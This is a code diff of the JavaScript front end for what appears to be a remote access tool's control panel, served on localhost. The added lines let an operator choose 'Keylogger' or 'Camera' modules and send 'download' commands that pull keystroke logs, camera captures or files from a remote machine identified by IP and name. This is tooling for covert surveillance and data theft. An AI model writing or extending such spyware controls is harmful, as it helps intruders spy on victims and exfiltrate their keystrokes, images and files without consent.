@@ -4,19 +4,29 @@ uri = "http://localhost:5000"
 
 function uploadFile(){
   var fileInput = document.querySelector('input[name="file_input"]:checked');
+  var module = document.getElementById("module").value;
   var path = document.getElementById('path').value;
   var resultDisplay = document.getElementById("uploadResult");
-  if(fileInput == null){
-    resultDisplay.textContent = "No file selected!";
-  }else if(path == ''){
+  
+  if(path == ''){
     resultDisplay.textContent = "No path!";
   }
-  else{
+  else {
     const formData = new FormData();
 
-    command = "download \"" + fileInput.value + "\" \"" + path + "\"";
+    var flag = "";
+    
+    if (module == "Keylogger")
+      flag = " -k";
+    else if (module == "Camera")
+      flag = " -c";
 
-    console.log(command);
+    if (fileInput != null)
+      command = "download" + flag + " \"" + fileInput.value + "\" \"" + path + "\"";
+    else 
+      command = "download" + flag + " -r \"" + path + "\"";
+    
+      console.log(command);
 
     formData.append("ip", ip);
     formData.append("name", name);
